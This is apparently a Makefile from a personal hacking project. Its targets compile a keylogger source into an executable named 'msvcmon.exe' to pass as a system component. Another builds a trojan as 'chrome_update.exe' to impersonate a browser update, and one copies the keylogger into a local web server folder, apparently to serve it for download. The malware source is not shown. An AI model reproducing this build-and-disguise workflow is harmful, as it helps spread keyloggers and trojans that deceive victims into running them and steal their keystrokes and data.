kylg_winapi:
	clang kylg_winapi.c -o msvcmon.exe -luser32 -lgdi32 -lkernel32


fakechrome:
	clang trojan.c -o chrome_update.exe -lwininet -luser32 -lole32 -lshell32 -static

move:
	mv "F:/projects/hacking projects/wintrapd/msvcmon.exe" "F:/command/xampp/htdocs/msvcmon.exe"

cmake-build: 
	cmake -S . -B build -G "MinGW Makefiles" -DCMAKE_C_COMPILER=clang -DCMAKE_CXX_COMPILER=clang++
	cmake --build build
